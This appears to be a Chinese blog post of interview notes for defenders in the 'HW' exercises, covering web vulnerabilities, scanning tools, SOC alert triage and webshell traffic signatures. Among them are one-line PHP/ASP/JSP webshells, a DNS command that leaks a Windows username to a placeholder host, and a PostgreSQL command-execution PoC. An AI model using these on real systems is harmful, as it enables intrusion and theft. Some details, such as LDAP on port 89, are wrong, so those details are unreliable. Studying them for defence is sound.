比如 GIF 图片 MIME为 image/gif,CSS 文件的 MIME为 text/css 等 ) 3. 文件内容检测 ( 避免图片中插入 webshell)\n\n- 图片二次渲染 ( 最变态的上传漏洞防御方式 , 基本上完全避免了文件上传漏洞 )\n\n- 文件重命名 ( 如随机字符串或时间戳等方式 , 防止攻击者得到 webshell 的路径 )\n\n- 隐藏上传路径\n\n\n\n### xff\n\nx-forwarded-for 表了HTTP的请求端真实的IP\n\n可以进行sql注入\n\n\n\n### sql注入写文件前提\n\n- 对web目录具有读写权限\n- 知道文件绝对路径\n- 能够使用联合查询（sql注入时）\n- secure_file_priv，File_priv\n\n\n\n### sqlmap一些参数\n\n```\n-h                  输出参数说明\n-hh                 输出详细的参数说明\n-v                  输出级别（0~6，默认1）\n-u url              指定url\n--data=DATA         该参数指定的数据会被作为POST数据提交\n-r file.txt         常用于POST注入或表单提交时注入\n-p / --skip         指定/跳过测试参数\n--cookie            设置cookie\n--force-ssl         强制使用SSL\n--threads           指定线程并发数\n--prefix            指定前缀\n--suffix            指定后缀\n--level             检测级别（1~5，默认1）\n--risk              风险等级（1~4，默认1）\n--all               列举所有可访问的数据（不推荐）\n--banner            列举数据库系统的信息等\n--current-user      输出当前用户\n--current-db        输出当前所在数据库\n--hostname          输出服务器主机名\n--is-dba            检测当前用户是否为管理员\n--users             输出数据库系统的所有用户\n--dbs               输出数据库系统的所有数据库\n-D DB               指定数据库\n--tables            在-D情况下输出库中所有表名\n-T table            在-D情况下指定数据表\n--columns           在-D -T情况下输出表中所有列名\n-C column           在-D -T情况下输出某列数据的值\n--dump              拉取数据存放到本地\n--dump-all          拉取所有可访问数据存放到本地\n--count             输出数据条目数量\n--search            搜索数据库名、表明、列名，需要与-D -T或-C 联用\n--sql-query         执行任意的SQL语句\n--sql-shell         使用交互式SQL语句执行环境\n--flie-read         读取文件\n--file-write        上传文件（指定本地路径）\n--file-dest         上传文件（指定目标机器路径）\n--os-cmd            执行任意系统命令\n--os-shell          使用交互式shell执行命令\n--batch             所有要求输入都选取默认值\n--wizard            初学者向导\n```\n\n\n\n\n\n### csrf\n\n攻击者可以盗用你的登陆信息，以你的身份模拟发送各种请求对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作\n\nCSRF 攻击的三个条件 :\n\n       1 . 用户已经登录了站点 A，并在本地记录了 cookie\n    \n       2 . 在用户没有登出站点 A 的情况下（也就是 cookie 生效的情况下），访问了恶意攻击者提供的引诱危险站点 B (B 站点要求访问站点A)。\n    \n       3 . 站点 A 没有做任何 CSRF 防御\n\n**漏洞检测**\n\n检测CSRF漏洞最简单的方法就是抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。\n\n\n\n**防御**\n\n1. 验证 HTTP Referer 字段；\n2. 在请求地址中添加 token 并验证；\n3. 在 HTTP 头中自定义属性并验证；\n4. Chrome 浏览器端启用 SameSite cookie\n\n\n\n### ssrf\n\n服务端请求伪造(Server-Side Request Forgery),指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。\n\n防御\n\n1、过滤返回的信息，如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。\n\n2、统一错误信息，避免用户可以根据错误信息来判断远程服务器的端口状态。\n\n3、限制请求的端口，比如80,443,8080,8090。\n\n4、禁止不常用的协议，仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp://等引起的问题。\n\n5、使用DNS缓存或者Host白名单的方式。\n\n\n\n### 水坑漏洞\n\n水坑攻击（Watering Hole Attack）”是一种网络攻击方式。攻击者通过在特定网页中植入恶意代码，来攻击访问该网页的用户\n\n防御\n\n（1）    及时更新操作系统及应用程序，修复已知漏洞；\n\n（2）    安装可以信赖的安全软件，及时发现网页浏览过程中的异常行为；\n\n（3）    监测所有网络传输流量，及时发现异常通信；\n\n\n\n### 鱼叉攻击\n\n鱼叉攻击，肯定是有看到了鱼再叉，也就是有针对性的攻击，目标明确，比如公司或团体，给这些特定团体发送包含木马的邮件，这种邮件要让受害者打开，就需要一个欺骗和迷惑的标题。这个题目和内容的构造就考验红方的想象力了。比如打补丁的通知邮件，放假通知安排，投诉举报，简历投递或者来点公司的劲爆信息引爆吃瓜群众。员工点了附件之后，就中了木马，黑客在远端就可以远程控制这个电脑了。\n\n### tomcat可以执行的后缀名\n\njsp html htm js css xml gif jpg png pdf doc xls\n\n### ssrf有哪些协议\n\nhttp https ftp smtp dns file \n\n\n\n### mysql数据库系统执行函数\n\n\n\n### nmap参数\n\n- -sS 半开扫描(TCP SYN扫描)，执行速度快，不容易被注意到，可以避免被记入目标系统的日志，需要root权限。它常常被称为半开放扫描， 因为它不打开一个完全的TCP连接。它发送一个SYN报文， 就像您真的要打开一个连接，然后等待响应。\n- -sT 当SYN扫描不能用时，TCP Connect()扫描就是默认的TCP扫描。会在⽬标主机的⽇志中记录⼤批连接请求和错误信息，但是由于是tcp connect()扫描，容易被记录。当SYN扫描可用时，它通常是更好的选择\n- -sP ping扫描，Nmap在扫描端⼜时，默认都会使⽤ping扫描，只有主机存活，Nmap才会继续扫描。\n- -sU UDP扫描，但UDP扫描是不可靠的，速度也比较慢\n- -sA 这种扫描与目前为止讨论的其它扫描的不同之处在于 它不能确定open(开放的)或者 open|filtered(开放或者过滤的))端口。 它用于发现防火墙规则，确定它们是有状态的还是无状态的，哪些端口是被过滤的。\n- -sV 探测端⼜服务版本\n- -Pn 扫描之前不需要⽤ping命令，有些防⽕墙禁⽌ping命令。可以使⽤此选项进⾏扫描\n- -v 显⽰扫描过程，推荐使⽤\n- -p 指定端⼜，如“1-65535、1433、135、22、80”等\n- -O 启⽤远程操作系统检测，存在误报\n- -O --osscan-limit 针对指定的目标进行操作系统检测\n- -O --osscan-guess 当Nmap无法确定所检测的操作系统时，会尽可能地提供最相近的匹配，Nmap默认 进行这种匹配\n- -A 全⾯系统检测、启⽤脚本检测、扫描等\n- -oN/-oX/-oG 将报告写⼊⽂件，分别是正常、XML、grepable 三种格式\n- -iL 读取主机列表，例如，-iL “C:\\ip.txt”\n\n\n\n### 天眼可以检测逻辑漏洞吗\n\n天眼的漏洞扫描模块主要基于静态代码分析和黑盒测试技术，对于逻辑漏洞的检测能力相对有限。\n\n\n\n### 内网渗透工具，代理\n\n\n\n### 渗透测试流程\n\n- 确定目标和范围：定义渗透测试的目标和范围，包括要测试的系统、应用程序、网络、物理设施等。\n- 收集情报：收集有关目标系统的信息，例如 IP 地址、操作系统类型、应用程序版本、网络拓扑等，以便进行后续测试。\n- 漏洞扫描：使用漏洞扫描工具对目标系统进行扫描，以发现已知的漏洞和弱点。\n- 渗透测试：通过手动测试和自动化工具进行渗透测试，包括尝试各种攻击向量，如 SQL 注入、XSS 攻击、文件包含漏洞、社交工程等。\n- 提交漏洞报告：将发现的漏洞和安全弱点整理成报告，详细描述漏洞的影响和风险，并提供建议和修复措施。\n- 清理痕迹：在测试完成后，清除所有测试过程中留下的痕迹，确保不会对目标系统造成任何影响或损害。\n- 重复测试：在修复漏洞后，进行重复测试以确认漏洞已被修复，并且没有引入新的漏洞。\n\n\n\n### 天眼日志分析语法                                                                                                     \n\n天眼日志分析语法（TianEye Log Query Syntax）是指在奇安信的天眼平台上，用于查询、分析和可视化各种日志数据的语法。以下是一些常见的天眼日志分析语法示例：\n\n1. 关键字查询：使用关键字查询指定时间段内的日志数据。例如，查询访问时间为2022年4月1日至4月30日之间的所有日志：\n\n```\nindex=xxx sourcetype=yyy access_time>=2022-04-01 access_time<=2022-04-30\n```\n\n精确匹配查询：使用精确匹配查询指定某个字段的值。例如，查询客户端 IP 地址为 192.168.1.100 的所有日志：\n\n```\nindex=xxx sourcetype=yyy client_ip=192.168.1.100\n```\n\n多条件查询：使用多个条件查询组合查询结果。例如，查询客户端 IP 地址为 192.168.1.100，且访问时间为2022年4月1日至4月30日之间的所有日志：\n\n```\nindex=xxx sourcetype=yyy client_ip=192.168.1.100 access_time>=2022-04-01 access_time<=2022-04-30\n```\n\n聚合查询：使用聚合函数统计查询结果。例如，查询某个时间段内 HTTP 访问次数最多的前 10 个客户端 IP 地址：\n\n```\nindex=xxx sourcetype=yyy access_time>=2022-04-01 access_time<=2022-04-30 | top 10 client_ip\n```\n\n可视化查询：使用可视化组件将查询结果可视化。例如，使用柱状图可视化某个时间段内 HTTP 访问次数最多的前 10 个客户端 IP 地址：\n\n```\nindex=xxx sourcetype=yyy access_time>=2022-04-01 access_time<=2022-04-30 | \n```\n\n### 天眼流量分析和威胁检测区别\n\n天眼流量分析和威胁检测是奇安信的天眼平台提供的两个不同的功能模块，它们的主要区别如下：\n\n1. 功能目标不同：天眼流量分析的主要目标是分析网络流量，了解网络拓扑结构、通信情况和性能状况，发现网络异常和瓶颈问题等；而威胁检测的主要目标是检测和预防网络威胁和攻击，包括漏洞扫描、入侵检测、恶意代码检测、网络流量分析等多个方面。\n2. 数据来源不同：天眼流量分析主要关注网络流量数据，可以采集和分析网络设备、流量数据、协议、应用等方面的数据；而威胁检测则需要多种数据源的支持，如安全事件日志、主机安全数据、网络安全数据、终端安全数据等。\n3. 数据处理方式不同：天眼流量分析主要采用流量抓包、协议解析、拓扑分析等技术进行数据处理和分析；而威胁检测则采用多种技术手段进行数据处理和分析，如恶意代码识别、行为分析、异常检测、漏洞扫描等。\n4. 应用场景不同：天眼流量分析主要适用于网络运维、网络性能分析、网络安全监控等领域；而威胁检测则适用于网络安全、信息安全等领域，可以帮助企业发现和防范各种网络威胁和攻击。\n\n\n\n### 天眼可以审0day吗\n\n不可以\n\n### 怎么判断自己的机器是不是域控\n\n1. 打开计算机管理器：在 Windows 操作系统中，可以通过在开始菜单中搜索“计算机管理器”来打开计算机管理器。\n2. 查看域：在计算机管理器中，展开“本地用户和组”或“计算机管理”等选项卡，然后选择“域”。如果机器加入了域并成为域控制器，将会在此处看到域的名称和其他域控制器的信息。\n3. 检查服务：在 Windows 操作系统中，域控制器会运行一些特定的服务，比如“Active Directory域服务”，“DNS服务器服务”等。可以通过打开“服务”选项卡来查看这些服务是否在运行，并且是否是自动启动。\n4. 检查系统信息：在 Windows 操作系统中，可以通过打开“系统信息”来查看机器的详细信息。在其中的“系统摘要”选项卡中，如果机器是域控制器，将会看到“角色”一栏显示“域控制器”。\n\n### 常见webshell流量体征\n\n- 异常流量：Webshell的流量通常会显示为异常流量，因为攻击者通常会通过Webshell上传和下载文件、执行命令等操作，这些操作都会产生大量不正常的流量。\n- 带有特定字符或字符串：Webshell可能会带有特定字符或字符串，如“eval(base64_decode(”，这些字符或字符串用于解码Webshell的命令或脚本，攻击者可能会使用这些字符或字符串来隐藏Webshell。\n- 频繁访问：Webshell的访问可能会比正常的用户访问频率更高，这是因为攻击者需要不断访问Webshell以获取控制目标服务器的权限。\n- 长时间运行的连接：Webshell的流量可能会包含长时间运行的连接，这是因为攻击者通常会保持Webshell的连接以便在需要时执行更多的操作。\n- 异常文件：Webshell可能会通过上传和下载文件来执行操作，因此出现异常文件或文件类型也可能是Webshell的流量体征。\n\n\n\n### 常用数据库默认端口及漏洞\n\n- 89 端口（ldap）安全漏洞：未授权访问 、弱口令\n  利用方式：通过LdapBrowser工具直接连入。\n- 1433 端口（Mssql）安全漏洞：弱口令、暴力破解\n  利用方式：差异备份getshell、SA账户提权等\n\n- 1521 端口（Oracle）安全漏洞：弱口令、暴力破解\n  利用方式：通过弱口令/暴力破解进行入侵。\n\n- 3306 端口（MySQL）安全漏洞：弱口令、暴力破解\n  利用方式：利用日志写入webshell、udf提权、mof提权等。\n\n- 5432 端口（ PostgreSQL）安全漏洞：弱口令、高权限命令执行\n  利用方式：攻击者通过弱口令获取账号信息，连入postgres中，可执行系统命令。PoC参考： DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM ‘id’; SELECT * FROM cmd_exec;\n\n- 5984 端口（CouchDB）安全漏洞：垂直权限绕过、任意命令执行\n  利用方式：通过构造数据创建管理员用户，使用管理员用户登录，构造恶意请求触发任意命令执行。后台访问：http://:5984/_utils\n\n- 6379 端口（Redis）安全漏洞：未授权访问\n  利用方式：绝对路径写webshell 、利用计划任务执行命令反弹shell、公私钥认证获取root权限、主从复制RCE等。\n\n- 9200 端口（elasticsearch）安全漏洞：未授权访问、命令执行\n\n### 目标ip是邮件服务器要怎么处理\n\n1. 检查邮件服务器是否正常运行：您可以通过尝试连接到邮件服务器并发送一封电子邮件来检查邮件服务器是否正常运行。如果邮件服务器无法连接或无法发送电子邮件，则可能需要检查邮件服务器的配置或网络设置。\n2. 检查安全设置：邮件服务器需要设置安全措施以保护电子邮件和用户数据，如防火墙、反病毒软件和邮件过滤器等。您可以检查这些设置是否已启用或需要进行更新。\n3. 更新邮件服务器软件：如果您的邮件服务器软件已经过时，可能需要更新到最新版本以修复可能存在的安全漏洞和错误。\n4. 监控邮件服务器流量：监控邮件服务器的流量可以帮助您识别和防止未经授权的访问或攻击。您可以使用日志分析工具或流量监控工具来监控邮件服务器的流量，并检查是否存在异常活动。\n5. 增强安全措施：除了基本的安全措施，您还可以考虑增强邮件服务器的安全措施，如强密码策略、多因素身份验证和加密等。这些措施可以帮助保护邮件服务器免受恶意\n\n### 目的ip是114.114.114.114端口是53需要封禁吗\n\n\n\n### 群里面遇到exe可执行程序怎么处理\n\n1. 不要下载或运行未知来源的可执行程序。如果你不确定该程序是否安全，请询问发送者或其他群组成员。\n2. 使用杀毒软件进行扫描。如果你已经下载了该程序并想运行它，可以使用杀毒软件进行扫描，以确保它不包含任何恶意软件。\n3. 隔离该文件。如果你怀疑该程序可能会造成破坏，请将其隔离在一个安全的位置，以防止其对你的计算机系统造成任何影响。\n4. 通知管理员。如果你认为该程序可能会对其他群组成员造成威胁，请及时通知管理员或相关人员，并让他们采取适当的措施来处理该问题。\n5. 虚拟机打开\n\n### 遇到远控木马告警如何处理\n\n1. 立即断开网络连接。为了防止该木马进一步攻击计算机或服务器，你应该立即断开网络连接，包括断开无线网络和网线连接等。\n2. 扫描计算机或服务器。使用安全软件对计算机或服务器进行全面扫描，以检测和清除远控木马。确保使用更新的杀毒软件，以提高检测和清除恶意软件的能力。\n3. 更改密码。更改所有重要帐户的密码，例如电子邮件、在线银行、社交媒体等。确保密码是复杂且难以猜测的，建议使用密码管理器。\n4. 及时备份数据。备份所有重要数据，包括文件、文档、照片等，以防止数据丢失。\n5. 更新操作系统和软件。确保计算机或服务器上的操作系统和所有软件都是最新的，以填补可能的安全漏洞。\n6. 通知安全管理员。如果你在工作环境中发现远控木马，应立即通知安全管理员或信息安全团队，并遵循公司的安全政策和流程。\n\n\n\n### cs\n\n一款渗透测试神器\n\nhttps://blog.csdn.net/zzwwhhpp/article/details/111773395\n\n\n\n### wireshark过滤条件\n\nip.src eq 192.168.1.107 or ip.dst eq 192.168.1.107\n\n或者\n\nip.addr eq 192.168.1.107 // 都能显示来源IP和目标IP\n\n\n\ntcp.port eq 80 // 不管端口是来源的还是目标的都显示\n\ntcp.port == 80\n\ntcp.port eq 2722\n\ntcp.port eq 80 or udp.port eq 80\n\ntcp.dstport == 80 // 只显tcp协议的目标端口80\n\ntcp.srcport == 80 // 只显tcp协议的来源端口80\n\n udp.port eq 15000\n\n 过滤端口范围\n\ntcp.port >= 1 and tcp.port <= 80\n\n\n\n\nth.dst == A0:00:00:04:C5:84 // 过滤目标mac\n\neth.src eq A0:00:00:04:C5:84 // 过滤来源mac\n\neth.dst==A0:00:00:04:C5:84\n\neth.dst==A0-00-00-04-C5-84\n\neth.addr eq A0:00:00:04:C5:84 // 过滤来源MAC和目标MAC都等于A0:00:00:04:C5:84的\n\n\n\nhttp.request.method == “GET”\n\nhttp.request.method == “POST”\n\nhttp.request.uri == “/img/logo-edu.gif”\n\nhttp contains “GET”\n\nhttp contains “HTTP/1.”\n\n\n\n### shiro反序列化漏洞\n\n1.1.3 漏洞原理\n\n  Apache Shiro框架提供了记住我的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。cookie的key为RememberMe，cookie的值是经过相关信息进行序列化，然后使用AES加密（对称），最后再使用Base64编码处理。服务端在接收cookie时：\n\n攻击者可以使用Shiro的默认密钥构造恶意序列化对象进行编码来伪造用户的Cookie，服务端反序列化时触发漏洞，从而执行命令\n\n### 蚁剑流量特征\n\n1.默认的 user-agent 请求头是 antsword xxx（可修改）\n\n 2.蚁剑的正文内容用URL加密，解密后流量最中明显的特征为ini_set(\"display_errors\",\"0\");\n\n\n\n### 勒索病毒传播方式有哪些\n\n- 网站挂马：用户浏览挂有木马病毒的网站，上网终端计算机系统极可能被植入木马并感染上勒索病毒。\n- 邮件传播：攻击者通过利用当前热门字样，在互联网上撒网式发送垃圾邮件、钓鱼邮件，一旦收件人点开带有勒索病毒的链接或附件，勒索病毒就会在计算机后台静默运行，实施勒索。\n- 漏洞传播：攻击者通过计算机操作系统和应用软件的漏洞攻击并植入病毒，最典型的案例是2017年在国内泛滥的WannaCry大规模勒索事件，攻击者正是利用微软445端口协议漏洞，进行感染传播网内计算机。\n- 捆绑传播：攻击者将勒索病毒与其他软件尤其是盗版软件、非法破解软件、激活工具进行捆绑，从而诱导用户点击下载安装，并随着宿主文件的捆绑安装进而感染用户的计算机系统。\n- 介质传播：攻击者通过提前植入或通过交叉使用感染等方式将携有勒索病毒的U盘、光盘等介质进行勒索病毒的移动式传播。\n\n### log4j漏洞\n\n该漏洞的主要原因是log4j在日志输出中，未对字符合法性进行严格的限制，执行了JNDI协议加载的远程恶意脚本，从而造成RCE\n\n\n\n### wireshark抓到数据包之后你怎么去分析\n\n\n\n### redis mongodb端口号\n\nredis 6379   \n\nmongoDB 27017\n\n\n\n### 天眼探针有什么功能\n\n\n\n### 天眼能否检索网络日志\n\n\n\n### struct2命令执行漏洞\n\nStruts2的action:、redirect:和redirectAction:前缀参数在实现其功能的过程中使用了Ognl表达式，并将用户通过URL提交的内容拼接入Ognl表达式中，从而造成攻击者可以通过构造恶意URL来执行任意Java代码，进而可执行任意命令\n\n\n\n### 如果目的端口为: x.X.x.x,操作系统win7或者win8，检索语句要怎么写\n\n\n\n### 怎么写模糊查询告警类型为写入文件的检索语句\n\n\n\n### 如果出现两条相同的sql注入告警你会怎么处理\n\n\n\n### 如果出现蠕虫病毒告警，如何处理\n\n\n\n### php命令执行函数\n\n**system()，passthru()，exec()，pcntl_exec()，shell_exec()，popen()/proc_popen()，反引号 ``**\n\n\n\n### 冰蝎流量特征\n\nAccept: application/json, text/javascript, */*; q=0.01\n\nContent-type: Application/x-www-form-urlencoded\n\n冰蝎设置了10种User-Agent,每次连接shell时会随机选择一个进行使用。\n\n冰蝎与webshell建立连接的同时，javaw也与目的主机建立tcp连接，每次连接使用本地端口在49700左右，每连接一次，每建立一次新的连接，端口就依次增加。\n\n$post=Decrypt(file_get_contents(\"php://input\"));\n\n\n\n### 哥斯拉流量特征\n\nAccept为text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\n\ncookie中分号结尾\n\n和请求体一样，请求响应体也分两个格式，base64编码的和原始加密raw数据。如果请求体采用base64编码，响应体返回的也是base64编码的数据。在使用base64编码时，响应体会出现一个很明显的固定特征。这个特征是客户端和服务端编写的时候引入的。\n\n从代码可以看到会把一个32位的md5字符串按照一半拆分，分别放在base64编码的数据的前后两部分。整个响应包的结构体征为：md5前十六位+base64+md5后十六位。\n从响应数据包可以明显看到这个特征，检测时匹配这个特征可以达到比较高的检出率，同时也只可以结合前面的一些弱特征进行检查，进一步提高检出率。因为md5的字符集范围在只落在0123456789ABCDEF范围内，因此很容易去匹配，正则匹配类似于(?i:[0-9A-F]{16})[\\w+/]{4,}=?=?(?i:[0-9A-F]{16})。需要注意的是md5需要同时匹配字母大小写两种情况，因为在JAVA版webshell响应中为大写字母，在PHP版中为小写字母。\n\n\n\n### 发现有入侵攻击，查看主机的哪些日志\n\n/var/log/\n\n\n\n### 如何防范反序列化漏洞\n\n防范反序列化漏洞的方法主要包括以下几点：\n\n1. 输入过滤：在接收用户输入时，进行有效性验证和输入过滤，避免恶意输入。\n2. 对象序列化前加密：对即将进行序列化的对象中的敏感数据或者方法进行加密处理，避免序列化后数据被篡改。\n3. 签名校验：利用数字签名技术，在序列化和反序列化的过程中添加签名机制，校验序列化对象是否经过篡改。\n4. 更新库文件：定期更新使用的序列化库文件，避免因为库文件中的漏洞而导致反序列化漏洞的产生。\n5. 减少依赖第三方类库：减少依赖第三方类库的情况，避免由于第三方类库中的漏洞而导致反序列化漏洞的产生。\n6. 最小化序列化：精简序列化对象中的属性，避免不必要的属性被序列化，从而降低反序列化的风险。\n\n以上是防范反序列化漏洞的一些基本方案。此外，如果使用的是Java语言，还可以通过Java Security Manager来控制反序列化操作的权限。在开发项目时，应该尽可能地避免使用Java反序列化操作，或者在进行序列化和反序列化操作时，更加谨慎的写好对应的代码和相关配置。\n\n\n\n### 天眼上显示多个不同url的SQL注入告警，可能是什么原因？\n\n可能是网站存在多个不同的漏洞点，或者攻击者利用了不同的注入方式和参数来尝试注入，导致出现多个不同的SQL注入告警。此外，也有可能是天眼扫描器在扫描过程中出现了误报或者漏报情况，需要对告警进行仔细分析和验证。建议及时修复漏洞点，防范SQL注入等安全威胁。\n\n\n\n### 我们在天眼上遇到文件上传告警时，应急响应的流程是怎样的？ 同一台资产多次发出同一个告警，可能的原因？\n\n应对文件上传告警的应急响应流程一般包括如下步骤：\n\n1. 确认告警情况：查看告警详细信息，包括文件类型、大小、上传时间、上传者、上传路径、上传方式、来源IP等，判断是否存在风险。\n2. 暂停上传功能：对于存在风险的上传功能，需要暂停上传功能，防止攻击者持续上传。\n3. 验证漏洞点：对上传功能进行全面测试，确认漏洞点，包括上传参数的类型、限制、验证等。\n4. 修复漏洞点：根据漏洞点的验证结果，提供相应的解决方案和实施措施，比如对上传文件进行类型、大小、扩展名、后缀名等多个方面的限制。\n5. 监测告警情况：在上传功能修复后，需对文件上传行为进行全面监测，查看是否仍然存在风险。\n\n同一台资产多次发出同一个告警可能是以下原因：\n\n1. 真实存在的漏洞：同一漏洞点被攻击者利用多次，导致多次告警。\n2. 系统误报：扫描器或监测设备存在误报，由于告警下发频繁，导致同一漏洞多次告警。\n3. 前置设备异常：网络设备、WAF等前置设备异常，导致同一个请求被多次拦截，产生多次告警。\n\n在排查告警原因时，需要进行仔细分析和判断，以确认是否存在真实风险。需要及时对真实漏洞进行修复和防范，对于误报和异常情况则需要针对性的进行排查和修复。\n\n\n\n### linux临时文件位置\n\n在Linux系统中，临时文件通常放置在以下几个目录中：\n\n1. /tmp目录：该目录是Linux系统中最常用的临时文件目录之一，任意用户都可以在该目录中创建、修改、删除文件。该目录下的文件在系统重启后会被清空。\n2. /var/tmp目录：该目录和/tmp目录类似，不同之处在于该目录下的文件在系统重启后不会被清空，需要手动删除。\n3. /dev/shm目录：该目录是一个ramfs文件系统，在内存中创建一个文件系统，并且把该文件系统挂载到/dev/shm目录下。该目录也可以作为临时文件目录使用，因为文件在内存中创建，所以读写速度较快。\n\n除了上述目录之外，还有一些应用程序会自己创建临时文件目录，例如Apache创建的临时文件夹为/var/cache/httpd，Nginx创建的临时文件目录为/var/run/nginx/client_body_temp。\n\n需要注意的是，在使用临时文件时，应尽可能使用系统默认的临时文件目录，避免用在不安全或者没有权限控制的目录。临时文件的权限也应该设置为仅能被创建者和目录管理员使用，并尽可能定期清理，以降低系统安全风险。\n\n\n\n### 使用天眼遇到sql告警怎么处理\n\n处理天眼上的SQL告警，一般需要按照以下步骤进行：\n\n1. 核实告警：对收到的告警首先进行核实，查看告警详情以确认告警是否为真实漏洞。\n2. 定位漏洞：确认告警存在后，需要进行漏洞定位，以查找漏洞原因和具体位置，检查SQL查询参数、输入过滤、数据库配置等方面。\n3. 修复漏洞：根据定位得到的漏洞内容，进行相应的安全加固和漏洞修复，比如优化SQL查询语句、加强输入过滤、修复数据库配置等。\n4. 验证修复结果：在修复漏洞后，需要再次测试系统以验证修复结果，确保系统安全性得到提高。\n5. 预防未来漏洞：在修复漏洞之后，需要对SQL注入漏洞进一步加强防范和监测，避免类似漏洞重演。\n\n需要注意的是，上述过程应该配合严格的访问控制和身份认证机制，并进行安全审计来保证系统的安全性。另外，如果使用天眼监测到SQL注入漏洞的话，可以结合其他安全工具如WAF来对系统进行进一步防御。通过不断加强安全防护链的研发和落地，能让系统安全得到有力地提升。","source":"_posts/HW prepare.md","raw":"---\ntitle: HW prepare\ndate: 2023-04-12 21:20:31\nexcerpt: HW prepare\ncategories: 学习\n---\n\n# HW prepare\n\n### 对hw的理解\n\n我个人觉得护网行动是国家重视网络安全的一种体现，目的是发现企业政府安全问题并解决，提供安全能力\n\nhw分为蓝队防守方和红队攻击方\n\n\n\n### hw防守人员组成\n\n监控组：监控组主要就是对WAF、IPS等安全设备进行7*24小时监控、派发、跟踪、反馈安全威胁\n\n研判组：研判组主要是技术支撑，对于监控组发现的攻击行为进行技术研判\n\n网络处置组：网络处置组主要职责就是发现攻击时在防火墙上对攻击方进行IP封锁，溯源等等\n\n应用处置组：应用处置组主要就是对发现的攻击和漏洞进行风险处置、安全加固\n\n\n\n### 安全产品了解哪些\n\n- 防火墙一般不属于区域的边界，如数据中心中核心区域和业务区域的边界防火墙、园区网络边界防火墙等，主要做保证边界安全\n- 抗D也叫抗DDOS设备即流量清洗设备，一般部署与网络最外侧，防止大规模僵尸网络入侵，内部有一套完整的机制可以区分哪些流量是用户正常流量和僵尸网络流量，可以保障数据中心可以提供完整的数据中心服务；\n- 负载均衡设备分为全局负载均衡（GLB）和链路负载均衡（LLB）以及服务器负载均衡（SLB）。GLB可以保障用户可以访问就近的数据中心提供的服务资源，LLB可以保障流量的出栈负载均衡和入栈负载均衡。SLB可以保障服务器对外服务的时候负载更平均、可靠；\n- WAF即[web应用防火墙](https://cloud.tencent.com/product/waf?from=20065&from_column=20065)，可以防止网站挂马保障网页安全，部署在WEB服务器区域；\n- 数据库审计设备是把对数据库所有的操作记录下来，方便后期溯源审计和责任明确，部署在运维管理区域或者数据库审计区域均可。\n- 漏扫即[漏洞扫描](https://cloud.tencent.com/product/vds?from=20065&from_column=20065)就是给系统做体检，可以扫描出操作系统漏洞、数据库漏洞、WEB漏洞，方便管理员对暴露出的漏洞情况进行安全加固。一般部署在安全检测区域。\n- 网页防篡改一般和WAF配合使用，保护web网页不被黑客篡改，如果被篡改了，那结果仍然可以显示篡改前的正常页面，在政府行业用的最多。一般是软件直接安装在WEB服务器上。\n- 上网行为管理设备说白了是可以记录员工的上网行为，包括浏览网页的地址、检索内容、聊天记录等，一般旁挂于核心交换机。\n- 堡垒机即运维审计设备，所有涉及到登录设备（如服务器、存储、交换机、防火墙等ICT产品）的操作都要先登录到堡垒机统一登录入口。同时所有的操作都会被审计下来，方便后期溯源取证。\n\n### \n\n### pdf解析有没有可能存在xxe\n\n是的，PDF 解析器可能存在 XXE（XML 外部实体注入）漏洞。这是因为 PDF 格式支持内嵌 XML 数据，并且一些 PDF 解析器可能会对这些数据进行处理，其中可能包含 XML 实体。\n\n\n\n### http协议里面method和data\n\n方法\t描述\t是否包含主体\nGET\t从服务器获取一份文档\t否\nHEAD\t只从服务器获取文档的首部\t否\nPOST\t向服务器发送带要处理的数据\t是\nPUT\t将请求的主体部分存储在服务器上\t是\nTRACE\t对可能经过代理服务器传送到服务器上去的报文进行追踪\t否\nOPTIONS\t决定可以在胀务器上执行哪些方法\t否\nDELETE\t从服务器上删除一份文档\t否\n\n\n\n### 威胁情报告警如何判断\n\n\n\n\n\n### 网络攻击类的告警要怎么判断\n\n\n\n### sql注入的修复方式\n\n- SQL语句预编译\n- 针对SQL输入内容进行限制、过滤 //目前使用WAF对这一块进行处理\n- 针对提交的关键数据进行转义 ，比如\\select\n- 关闭错误信息输出 ，因为有些错误返回信息，会返回物理路径、数据库版本信息等\n- 数据库权限严格控制 ，不同级别的用户，只能进行相应级别权限的操作\n- 敏感信息严格加密处理\n\n\n\n### 网络攻击的方向来自哪三个方向\n\n\n\n### 如何判断攻击是不是误报\n\n\n\n### DNS外带存在哪些漏洞\n\n- sql盲注\n\n- XSS\n\n- 命令执行\n\n- windows可以查询主机用户名等\n\n  ping %USERNAME%.XXX.CEYE.IO\n\n- xxe\n\n- ssrf\n\n\n\n### 什么是攻防演练\n\n网络安全实战攻防演练是以获取指定目标系统（标靶系统）的管理权限为目标的攻防演练，由攻防领域经验丰富的红队专家组成攻击队，在保障业务系统稳定运行的前提下，采用“不限攻击路径，不限制攻击手段”的贴合实战方式，而形成的“有组织”的网络攻击行动。攻防演练通常是在真实网络环境下对参演单位目标系统进行全程可控、可审计的实战攻击，拟通过演练检验参演单位的安全防护和应急处置能力，提高网络安全的综合防控能力。\n\n\n\n### 怎么判断socket代理\n\n> 通过 Websocket 的 bufferedAmount 来探测用户是否采用来代理\n>\n> 1. Client 通过 Websocket 与 Server 建立连接\n> 2. Server 监听到 connect 事件后，将本次 TCP 的 window size 设置为 0，这也就意味着 Client 无法继续将数据包传给 server\n> 3. Client 使用 websocket.send()持续发送几个包\n> 4. 在 Client 上观察 websocket.bufferedAmount 值，如果过了一会，这个值一直在增大，说明无代理，否则存在代理\n>    为啥可以通过这个值来判断呢？这是因为代理工具一般不会转发 TCP 的设置，也就是说，开启了代理的 Client 发出的包会被代理给吃掉\n\n\n\n### 一句话木马\n\n```\n<?php @eval($_POST[1]);?>    php\n<%eval request(\"chopper\")%>   asp\n <%Process process = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>  jsp\n\n```\n\n\n\n### 社工手段有哪些\n\n- 邮件钓鱼 \n- 伪装成熟人\n\n\n\n### 